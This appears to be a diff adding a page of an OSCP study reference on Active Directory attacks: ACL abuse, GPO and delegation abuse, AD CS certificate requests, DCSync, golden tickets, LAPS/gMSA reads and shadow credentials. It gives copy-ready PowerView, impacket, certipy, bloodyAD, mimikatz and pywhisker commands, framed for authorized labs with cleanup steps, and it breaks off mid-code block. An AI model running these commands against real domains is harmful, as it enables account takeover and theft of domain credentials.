@@ -1,0 +1,369 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="generator" content="Astro v7.2.0"><meta name="description" content="Commands, variants, interpretation and next actions for Object Control, AD CS and Domain Compromise."><meta name="theme-color" content="#121414"><link rel="canonical" href="https://armaanleg3nd.github.io/tools/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/"><link rel="icon" href="/favicon.svg" type="image/svg+xml"><meta property="og:title" content="Object Control, AD CS and Domain Compromise | OSCP reference | Armaan"><meta property="og:description" content="Commands, variants, interpretation and next actions for Object Control, AD CS and Domain Compromise."><meta property="og:type" content="website"><meta property="og:url" content="https://armaanleg3nd.github.io/tools/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/"><title>Object Control, AD CS and Domain Compromise | OSCP reference | Armaan</title><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="swap"><script type="module" src="/_assets/ClientRouter.astro_astro_type_script_index_0_lang.xc6nT38P.js"></script><link rel="stylesheet" href="/_assets/BaseLayout.C8rLAhpp.css"><link rel="stylesheet" href="/_assets/ToolLayout.Bh0Ez8ox.css"><style>.full-reference{max-width:1420px;color:var(--text);margin:auto;padding:2rem clamp(1rem,4vw,4rem) 5rem}.full-reference a{color:var(--cyan-soft)}.full-reference h1{margin:1.25rem 0;font-size:clamp(1.7rem,3vw,2.5rem);line-height:1.2}.full-reference p{color:var(--muted);max-width:80ch;line-height:1.8}.reference-find{gap:.6rem;max-width:44rem;margin:1.5rem 0;font-size:.85rem;display:grid}.reference-find input{border:1px solid var(--line-strong);background:var(--surface-low);color:var(--text);border-radius:3px;padding:.8rem}.reference-index{grid-template-columns:repeat(2,minmax(0,1fr));gap:2rem;display:grid}.reference-index section{min-width:0}.reference-index h2{text-transform:capitalize;border-bottom:1px solid var(--line);padding-bottom:.7rem;font-size:1.2rem}.reference-index h3{margin:1.3rem 0 .5rem;font-size:1rem}.reference-index ul{padding-left:1.2rem;font-size:.84rem;line-height:1.9}.reference-index .level-3{color:var(--muted);margin-left:1rem;font-size:.76rem}.reference-index [hidden]{display:none}.reference-reading{grid-template-columns:240px minmax(0,1fr);gap:2.5rem;display:grid}.reference-reading nav{top:calc(var(--header-height) + 1rem);max-height:calc(100dvh - var(--header-height) - 2rem);border-right:1px solid var(--line);align-self:start;padding:1rem;font-size:.76rem;position:sticky;overflow:auto}.reference-reading nav ul{padding:0;list-style:none}.reference-reading nav li{margin:.7rem 0;line-height:1.5}.reference-reading nav .level-3{padding-left:1rem;font-size:.7rem}.reference-prose{min-width:0;line-height:1.85}.reference-prose :is(h1,h2,h3,h4){scroll-margin-top:calc(var(--header-height) + 1.5rem);margin:2rem 0 1rem;line-height:1.35}.reference-prose h2{border-top:1px solid var(--line);padding-top:1.5rem;font-size:1.35rem}.reference-prose h3{font-size:1.05rem}.reference-prose pre{border:1px solid var(--line);background:var(--surface-low);max-width:100%;font:.8rem/1.75 var(--mono);border-radius:3px;padding:2.5rem 1rem 1rem;position:relative;overflow:auto}.reference-prose [data-reference-copy]{border:1px solid var(--line);color:var(--cyan-soft);font:.65rem var(--mono);cursor:pointer;background:0 0;padding:.2rem .5rem;position:absolute;top:.4rem;right:.5rem}.reference-prose code{overflow-wrap:anywhere;font-size:.85em}.reference-prose pre code{overflow-wrap:normal;font-size:inherit}.reference-prose blockquote{border-left:2px solid var(--cyan);color:var(--muted);margin:1.25rem 0;padding-left:1rem}.reference-prose table{border-collapse:collapse;max-width:100%;font-size:.8rem;display:block;overflow:auto}.reference-prose :is(td,th){border:1px solid var(--line);text-align:left;padding:.6rem}.reference-prose img{max-width:100%;height:auto}.reference-prose details{border-top:1px solid var(--line);padding:.8rem 0}.reference-prose summary{cursor:pointer;color:var(--cyan-soft)}@media (width<=850px){.reference-index,.reference-reading{grid-template-columns:1fr}.reference-reading nav{border:1px solid var(--line);max-height:18rem;position:static}.full-reference{padding-top:1rem}}
+</style><style>[data-astro-transition-scope="astro-nfpogox7-1"] { view-transition-name: page-content; }@layer astro { ::view-transition-old(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style></head><body><a class="skip-link" href="#main-content">Skip to content</a><header class="site-header" data-astro-cid-wpvy4v7s><nav class="site-nav" aria-label="Primary navigation" data-astro-cid-wpvy4v7s><a class="brand" href="/" aria-label="leg3nd home" data-astro-cid-wpvy4v7s><span data-astro-cid-wpvy4v7s>leg3nd</span><small data-astro-cid-wpvy4v7s>Projects &amp; tools</small></a><button class="nav-toggle" type="button" aria-expanded="false" aria-controls="nav-links" data-astro-cid-wpvy4v7s><span data-astro-cid-wpvy4v7s>MENU</span><span class="nav-toggle__glyph" aria-hidden="true" data-astro-cid-wpvy4v7s>[+]</span></button><div class="nav-links" id="nav-links" data-astro-cid-wpvy4v7s><a href="/" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>01</span>Home</a><a href="/projects/" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>02</span>Projects</a><a href="/tools/" class="active" aria-current="page" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>03</span>Tools</a></div><div class="system-state" aria-label="Timezone" data-astro-cid-wpvy4v7s>GMT+8</div></nav></header><script type="module">var e=()=>{let e=document.querySelector(`.nav-toggle`),t=document.querySelector(`.nav-links`);if(!e||!t||e.dataset.bound===`true`)return;e.dataset.bound=`true`;let n=()=>{e.setAttribute(`aria-expanded`,`false`),t.dataset.open=`false`;let n=e.querySelector(`.nav-toggle__glyph`);n&&(n.textContent=`[+]`)};e.addEventListener(`click`,()=>{let n=e.getAttribute(`aria-expanded`)===`true`;e.setAttribute(`aria-expanded`,String(!n)),t.dataset.open=String(!n);let r=e.querySelector(`.nav-toggle__glyph`);r&&(r.textContent=n?`[+]`:`[-]`)}),t.addEventListener(`click`,e=>{e.target.closest(`a`)&&n()}),e.closest(`nav`)?.addEventListener(`keydown`,t=>{t.key===`Escape`&&(n(),e.focus())})};document.addEventListener(`astro:page-load`,e),e();</script><div data-astro-transition-scope="astro-nfpogox7-1" id="main-content"><div class="tools-surface"><main class="full-reference"><p><a href="/tools/oscp/reference/">← Complete task index</a> · <a href="/tools/oscp/">Workspace</a></p><div class="reference-reading"><nav aria-label="On this page"><strong>On this page</strong><ul><li class="level-2"><a href="#directory-object-control">Directory-object control</a></li><li class="level-3"><a href="#password-reset">Password reset</a></li><li class="level-3"><a href="#group-membership">Group membership</a></li><li class="level-3"><a href="#targeted-kerberoast-through-spn-write">Targeted Kerberoast through SPN write</a></li><li class="level-3"><a href="#owner-and-dacl-transitions">Owner and DACL transitions</a></li><li class="level-2"><a href="#conditional-gpo-control">Conditional: GPO control</a></li><li class="level-2"><a href="#conditional-delegation-paths">Conditional: delegation paths</a></li><li class="level-3"><a href="#resource-based-constrained-delegation">Resource-based constrained delegation</a></li><li class="level-2"><a href="#conditional-ad-cs-enumeration">Conditional: AD CS enumeration</a></li><li class="level-2"><a href="#conditional-certificate-request-and-authentication">Conditional: certificate request and authentication</a></li><li class="level-2"><a href="#conditional-esc4template-write-boundary">Conditional: ESC4/template-write boundary</a></li><li class="level-2"><a href="#dcsync-replication-rights">DCSync replication rights</a></li><li class="level-2"><a href="#conditional-high-impact-ticket-forging-concepts">Conditional: high-impact ticket-forging concepts</a></li><li class="level-2"><a href="#bloodyad--linux-side-ldap-reads-and-permission-backed-writes">bloodyAD — Linux-side LDAP reads and permission-backed writes</a></li><li class="level-2"><a href="#delegated-reads--laps-and-gmsa-material">Delegated reads — LAPS and gMSA material</a></li><li class="level-2"><a href="#shadow-credentials--object-key-write-pkinit-then-cleanup">Shadow credentials — object-key write, PKINIT, then cleanup</a></li><li class="level-2"><a href="#passthecert--schannelldap-when-the-certificate-is-usable-there">PassTheCert — Schannel/LDAP when the certificate is usable there</a></li><li class="level-2"><a href="#powermad--create-an-account-only-when-the-chosen-ad-path-needs-it">Powermad — create an account only when the chosen AD path needs it</a></li><li class="level-2"><a href="#gmsa--obtain-a-decoded-hash-only-with-managed-password-read-rights">gMSA — obtain a decoded hash only with managed-password read rights</a></li><li class="level-2"><a href="#sources">Sources</a></li></ul></nav><article class="reference-prose"><h1 id="object-control-ad-cs-and-domain-compromise">Object Control, AD CS and Domain Compromise</h1>
+<p><a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/README.md">← Stage index</a> | <a href="/tools/oscp/reference/06-ad-lateral-movement/01-domain-mapping/">Domain mapping</a> | <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/cheatsheets/active-directory.md">AD cheatsheet</a> | <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/Attack_Strategy_Map.md">Strategy map</a> | Study methods: <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/methods/ad-mapping.md">Map Active Directory attack paths</a>; <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/methods/ad-identities.md">Gain a more useful domain identity</a></p>
+<blockquote>
+<p><strong>Active Block 11 core:</strong> user, group, SPN and DACL-backed identity transitions, plus the rights required for DCSync.</p>
+<p><strong>Conditional supplements:</strong> GPO abuse, delegation/RBCD and AD CS remain evidence-led branches rather than core Block 11 study.</p>
+</blockquote>
+<h2 id="directory-object-control">Directory-object control</h2>
+<blockquote>
+<p><strong>Model:</strong> controlled principal → effective ACE → target object/type → permitted modification → authentication/authorization effect → cleanup.</p>
+</blockquote>
+<p>Enumerate a target's ACL with resolved GUIDs:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Import-Module .\PowerView.ps1
+Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs |
+  Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|ExtendedRight' }
+</code></pre>
+<p>Resolve trustees:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">ConvertFrom-SID 'S-1-5-21-...'
+Get-DomainObject -Identity 'S-1-5-21-...' | Select-Object samaccountname,objectclass
+</code></pre>
+<p>Common effects require different rights:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Right/object</th><th>Possible controlled effect</th><th>Validation needed</th></tr></thead><tbody><tr><td><code>GenericAll</code>/password-reset extended right on user</td><td>Reset the user's password</td><td>Effective trustee, account state, protected-object behavior</td></tr><tr><td><code>GenericAll</code> or effective member-attribute write on group</td><td>Add a controlled principal to the group</td><td>Target group, nesting and a refreshed logon token</td></tr><tr><td><code>GenericWrite</code>/SPN-property write on user</td><td>Add a temporary SPN, request a TGS and remove it</td><td>Exact property right, duplicate-SPN checks and cleanup</td></tr><tr><td><code>WriteDacl</code></td><td>Grant a narrower right</td><td>Ability to write DACL and restore original ACL</td></tr><tr><td><code>WriteOwner</code></td><td>Change owner, then possibly DACL</td><td>Owner semantics and cleanup</td></tr><tr><td>Computer-object write</td><td>RBCD-related attribute change</td><td>Machine account/control, SPN/Kerberos and target service</td></tr></tbody></table>
+<h3 id="password-reset">Password reset</h3>
+<p>A password-reset right creates a new password credential; it does not reveal the old one. This is disruptive because an unknown original password cannot be restored.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">$Secure = ConvertTo-SecureString 'TEMP_PASSWORD' -AsPlainText -Force
+Set-DomainUserPassword -Identity TARGET_USER -AccountPassword $Secure -Verbose
+net user TARGET_USER TEMP_PASSWORD /domain
+</code></pre>
+<p>Validate the account state and authenticate only to an approved service as the target identity. Prefer a reversible route when one exists.</p>
+<h3 id="group-membership">Group membership</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Add-DomainGroupMember -Identity TARGET_GROUP -Members CONTROLLED_USER -Verbose
+Get-DomainGroupMember -Identity TARGET_GROUP |
+  Where-Object { $_.MemberName -eq 'CONTROLLED_USER' }
+
+# Built-in alternative
+net group TARGET_GROUP CONTROLLED_USER /add /domain
+</code></pre>
+<p>A current session may not receive the new group SID until a fresh logon. Validate with a new session/token, then remove the membership after the authorized objective:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Remove-DomainGroupMember -Identity TARGET_GROUP -Members CONTROLLED_USER -Verbose -Confirm:$false
+net group TARGET_GROUP CONTROLLED_USER /delete /domain
+</code></pre>
+<h3 id="targeted-kerberoast-through-spn-write">Targeted Kerberoast through SPN write</h3>
+<p>If the effective right permits writing <code>servicePrincipalName</code> on a user, add a unique temporary SPN, request that account's ticket and remove the SPN immediately. The cracking workflow is in <a href="/tools/oscp/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions/">Kerberos and identity transitions</a>.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">setspn -S TEMP/TARGET_USER TARGET_USER
+setspn -Q TEMP/TARGET_USER
+Rubeus.exe kerberoast /user:TARGET_USER /outfile:TARGET_USER.tgs /format:hashcat
+setspn -D TEMP/TARGET_USER TARGET_USER
+</code></pre>
+<h3 id="owner-and-dacl-transitions">Owner and DACL transitions</h3>
+<p><code>WriteOwner</code> can make the controlled identity the owner; ownership may then permit a DACL change. <code>WriteDacl</code> can grant only the narrower right needed for the intended transition.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Set-DomainObjectOwner -Identity TARGET_OBJECT -OwnerIdentity CONTROLLED_USER -Verbose
+Add-DomainObjectAcl -TargetIdentity TARGET_OBJECT -PrincipalIdentity CONTROLLED_USER -Rights ResetPassword -Verbose
+
+# Group-membership variant
+Add-DomainObjectAcl -TargetIdentity TARGET_GROUP -PrincipalIdentity CONTROLLED_USER -Rights WriteMembers -Verbose
+
+# Remove the ACE after the authorized objective
+Remove-DomainObjectAcl -TargetIdentity TARGET_OBJECT -PrincipalIdentity CONTROLLED_USER -Rights ResetPassword -Verbose
+</code></pre>
+<p>Export the original owner/security descriptor before changing it and restore exactly that state. Password resets, membership changes, SPN writes, ownership changes and ACE grants are state changes; do not execute merely because a graph shows an edge.</p>
+<h2 id="conditional-gpo-control">Conditional: GPO control</h2>
+<p>Identify GPOs and links:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Get-DomainGPO
+Get-DomainOU | Select-Object name,distinguishedname,gplink
+Get-DomainObjectAcl -SearchBase 'CN=Policies,CN=System,DC=DOMAIN,DC=TLD' -ResolveGUIDs |
+  Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteProperty' }
+</code></pre>
+<p>For a candidate, prove:</p>
+<ol>
+<li>the controlled principal can edit both the directory object and relevant SYSVOL policy files;</li>
+<li>the GPO is linked to the OU containing the intended test host/user;</li>
+<li>security filtering and WMI filters include that subject;</li>
+<li>the configured preference/task/script runs in the expected context; and</li>
+<li>policy refresh or another predictable trigger will occur.</li>
+</ol>
+<p>SharpGPOAbuse supports immediate-task/local-group techniques, but syntax is version-sensitive and the action changes domain policy. Inspect the installed build before a controlled lab action:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">SharpGPOAbuse.exe --help
+gpresult /r
+gpupdate /force
+</code></pre>
+<p>Back up the GPO, restrict the target/scope, document the exact change and restore it after validation.</p>
+<h2 id="conditional-delegation-paths">Conditional: delegation paths</h2>
+<p>Enumerate before attempting any ticket operation:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Get-DomainComputer -Unconstrained | Select-Object dnshostname
+Get-DomainUser -TrustedToAuth | Select-Object samaccountname
+Get-DomainComputer -TrustedToAuth | Select-Object dnshostname
+Get-DomainObject -LDAPFilter '(msDS-AllowedToDelegateTo=*)' -Properties samaccountname,msds-allowedtodelegateto
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">impacket-findDelegation 'DOMAIN/USER:PASSWORD' -dc-ip DC_IP
+</code></pre>
+<p>Constrained delegation/S4U requires control of the delegated account/key and an allowed SPN:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">impacket-getST -spn ALLOWED_SPN -impersonate AUTHORIZED_TEST_USER \
+  -dc-ip DC_IP 'DOMAIN/DELEGATED_USER:PASSWORD'
+export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache"
+</code></pre>
+<p>Use the ticket only for the approved service/host. Unconstrained delegation can expose forwarded/cached tickets, but coercing authentication changes another host's behavior and is not a baseline. Validate only in a disposable authorized lab and protect ticket material.</p>
+<h3 id="resource-based-constrained-delegation">Resource-based constrained delegation</h3>
+<blockquote>
+<p><strong>Prerequisite:</strong> effective write control over the target computer's <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> plus control of a principal with an SPN (often a lab computer account).</p>
+</blockquote>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">impacket-addcomputer 'DOMAIN/USER:PASSWORD' -computer-name 'LABCOMPUTER$' \
+  -computer-pass 'LAB_MACHINE_PASSWORD' -dc-host DC_HOST -dc-ip DC_IP
+
+impacket-rbcd -delegate-from 'LABCOMPUTER$' -delegate-to 'TARGETCOMPUTER$' \
+  -action write -dc-ip DC_IP 'DOMAIN/USER:PASSWORD'
+
+impacket-getST -spn cifs/TARGET_HOST -impersonate AUTHORIZED_TEST_USER \
+  -dc-ip DC_IP 'DOMAIN/LABCOMPUTER$:LAB_MACHINE_PASSWORD'
+</code></pre>
+<p>Cleanup after the lab objective:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">impacket-rbcd -delegate-from 'LABCOMPUTER$' -delegate-to 'TARGETCOMPUTER$' \
+  -action remove -dc-ip DC_IP 'DOMAIN/USER:PASSWORD'
+impacket-addcomputer 'DOMAIN/USER:PASSWORD' -computer-name 'LABCOMPUTER$' \
+  -delete -dc-ip DC_IP
+</code></pre>
+<p>Machine-account quota, computer-object rights, DNS/SPN naming and target service authorization are separate prerequisites.</p>
+<h2 id="conditional-ad-cs-enumeration">Conditional: AD CS enumeration</h2>
+<blockquote>
+<p><strong>Prerequisite:</strong> reachable CA/DC and a valid domain identity. <strong>Decisive output:</strong> a CA/template whose enabled state, enrollment rights and configuration satisfy a specific ESC path.</p>
+</blockquote>
+<p>Package names vary:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">command -v certipy-ad || command -v certipy
+certipy-ad find -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \
+  -enabled -vulnerable -stdout
+</code></pre>
+<p>Review:</p>
+<ul>
+<li>CA name and host;</li>
+<li>template name and whether it is enabled/published;</li>
+<li>who can enroll;</li>
+<li>client-authentication EKUs/purpose;</li>
+<li>subject/SAN supply controls;</li>
+<li>manager approval/signature requirements;</li>
+<li>template owner and modification rights;</li>
+<li>web enrollment/relay-related configuration where relevant.</li>
+</ul>
+<p>An <code>ESC</code> label is a candidate classification. Manually validate the properties and the controlled identity's effective rights.</p>
+<h2 id="conditional-certificate-request-and-authentication">Conditional: certificate request and authentication</h2>
+<p>Generic request after validating a specific template:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">certipy-ad req -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \
+  -target DC_HOST -ca CA_NAME -template TEMPLATE
+</code></pre>
+<p>An alternate UPN/SID request is appropriate only when the validated template permits it and the lab explicitly authorizes impersonation testing:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">certipy-ad req -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \
+  -target DC_HOST -ca CA_NAME -template TEMPLATE \
+  -upn 'TEST_USER@DOMAIN' -sid 'TEST_USER_SID'
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">certipy-ad auth -pfx CERTIFICATE.pfx -dc-ip DC_IP
+</code></pre>
+<p>Treat PFX files, tickets and returned hashes as credentials. Verify certificate subject/SID, validity and intended identity. A successful issuance is not the same as successful PKINIT authentication.</p>
+<h2 id="conditional-esc4template-write-boundary">Conditional: ESC4/template-write boundary</h2>
+<p>Before any authorized template change, save configuration:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">certipy-ad template -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \
+  -template TEMPLATE -save-configuration template-backup.json
+</code></pre>
+<p>Template writes alter Active Directory configuration and may affect many principals. Use only an explicitly authorized disposable lab path, inspect <code>certipy-ad template -h</code> for the installed version, and restore the saved configuration after the demonstration.</p>
+<h2 id="dcsync-replication-rights">DCSync replication rights</h2>
+<blockquote>
+<p><strong>Prerequisite:</strong> effective domain-root rights equivalent to <code>Replicating Directory Changes</code> plus <code>Replicating Directory Changes All</code> (and filtered-set rights where applicable). Domain membership or local admin on an ordinary host is insufficient.</p>
+</blockquote>
+<p>Validate ACLs at the domain root:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Get-DomainObjectAcl -Identity 'DC=DOMAIN,DC=TLD' -ResolveGUIDs |
+  Where-Object { $_.ObjectAceType -match 'Replication-Get-Changes' }
+</code></pre>
+<p>A controlled DACL transition can grant these rights, but doing so changes the domain security descriptor and creates a domain-compromise path:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Add-DomainObjectAcl -TargetIdentity 'DC=DOMAIN,DC=TLD' -PrincipalIdentity CONTROLLED_USER -Rights DCSync -Verbose
+
+# Remove the delegated replication ACE after the authorized objective
+Remove-DomainObjectAcl -TargetIdentity 'DC=DOMAIN,DC=TLD' -PrincipalIdentity CONTROLLED_USER -Rights DCSync -Verbose
+</code></pre>
+<p>Local administrator rights on a member host, an LDAP bind or a valid Kerberos ticket do not supply replication rights. Re-read the effective domain-root ACL before and after a change.</p>
+<p>Request one approved test account rather than dumping the directory:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">impacket-secretsdump -just-dc-user TARGET_USER -dc-ip DC_IP \
+  'DOMAIN/USER:PASSWORD@DC_HOST'
+</code></pre>
+<p>Mimikatz equivalent from an authorized Windows context:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">lsadump::dcsync /domain:DOMAIN /user:TARGET_USER
+</code></pre>
+<blockquote>
+<p><strong>Decisive output:</strong> selected directory secret material returned through replication. Treat it as domain compromise evidence. Stop, protect evidence, document the delegated right and move to remediation reasoning rather than broad collection.</p>
+</blockquote>
+<h2 id="conditional-high-impact-ticket-forging-concepts">Conditional: high-impact ticket-forging concepts</h2>
+<p>Golden tickets require the domain SID and KRBTGT key. They are persistence/impact concepts, not a default Block 11 action. A forged ticket still depends on correct cryptographic material, realm, time and authorization. For the active service-scoped case, use <a href="/tools/oscp/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions/#8-silver-tickets-forge-one-service-ticket">Silver tickets</a>.</p>
+<p>Authorized isolated-lab examples:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash"># Golden: realm-wide TGT material
+impacket-ticketer -nthash KRBTGT_NT_HASH -domain-sid DOMAIN_SID \
+  -domain DOMAIN AUTHORIZED_TEST_USER
+
+export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache"
+klist
+</code></pre>
+<p>Use only against the approved service/host, record ticket metadata and remove generated credentials afterward. Domain recovery after KRBTGT exposure generally requires coordinated credential rotation and replication convergence; service-ticket exposure requires rotating the affected service/machine secret and reviewing access.</p>
+<h2 id="bloodyad--linux-side-ldap-reads-and-permission-backed-writes">bloodyAD — Linux-side LDAP reads and permission-backed writes</h2>
+<p>Use an authenticated LDAP context and the exact right on the target object. Start with a read. These writes are distinct alternatives selected by the observed ACL:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash"># Inspect the target/group instead of assuming the relationship
+bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \
+  get object TARGET_OBJECT --attr distinguishedName,member,memberOf
+
+# Force-change-password right on this specific account
+bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \
+  set password TARGET_USER 'NEW_PASSWORD'
+
+# Write-members right on this specific group
+bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \
+  add groupMember TARGET_GROUP USER
+</code></pre>
+<p>Read: verify the actual attribute change and test the resulting identity/capability through a compatible service. Group changes do not automatically refresh an existing process token/ticket. Access denied → inspect the object DACL and protected-account context; authentication alone is insufficient. Account Operators membership does not imply control over protected administrator accounts/groups.</p>
+<p>Sources: <a href="https://github.com/CravateRouge/bloodyAD/wiki/User-Guide">upstream 1</a>.</p>
+<h2 id="delegated-reads--laps-and-gmsa-material">Delegated reads — LAPS and gMSA material</h2>
+<p>Use when directory permissions grant access to the secret-bearing attribute. Being able to enumerate the computer or service account does not grant that read.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash"># Classic LAPS: password for the relevant computer's local administrator
+bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \
+  get object 'COMPUTER$' --attr ms-Mcs-AdmPwd
+
+# Windows LAPS: returned content/format depends on schema and protection
+bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \
+  get object 'COMPUTER$' --attr msLAPS-Password
+
+# gMSA: inspect the allowed managed-password attribute
+bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \
+  get object 'GMSA$' --attr msDS-ManagedPassword
+</code></pre>
+<p>Read: a LAPS value is scoped to the named host's local account. An encrypted Windows-LAPS value still needs the permitted decryption context. A gMSA blob/base64 string is not automatically a directly reusable NT hash: parse/decode it with a compatible gMSA tool before choosing authentication. Missing/denied attributes → distinguish schema, permissions and an empty value.</p>
+<p>Sources: <a href="https://github.com/CravateRouge/bloodyAD/wiki/User-Guide">upstream 1</a> · <a href="https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview">upstream 2</a>.</p>
+<h2 id="shadow-credentials--object-key-write-pkinit-then-cleanup">Shadow credentials — object-key write, PKINIT, then cleanup</h2>
+<p>Use only with effective write access to the target's <code>msDS-KeyCredentialLink</code>, a DC supporting the required key-trust/PKINIT behavior, correct time/DNS and compatible certificates. Inspect existing values first.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">python3 pywhisker.py -d DOMAIN -u USER -p 'PASSWORD' --dc-ip DC_IP \
+  --target TARGET_USER --action list
+
+# Adds a new key credential and generates certificate material; record its DeviceID
+python3 pywhisker.py -d DOMAIN -u USER -p 'PASSWORD' --dc-ip DC_IP \
+  --target TARGET_USER --action add --filename target-key
+
+# Use the generated PFX password; request the target principal's TGT
+python3 gettgtpkinit.py -cert-pfx target-key.pfx -pfx-pass 'PFX_PASSWORD' \
+  -dc-ip DC_IP DOMAIN/TARGET_USER target.ccache
+export KRB5CCNAME="$PWD/target.ccache"
+klist
+
+# Optional NT-hash recovery from this PKINIT TGT; key is the printed AS-REP key
+python3 getnthash.py -key AS_REP_KEY -dc-ip DC_IP DOMAIN/TARGET_USER
+
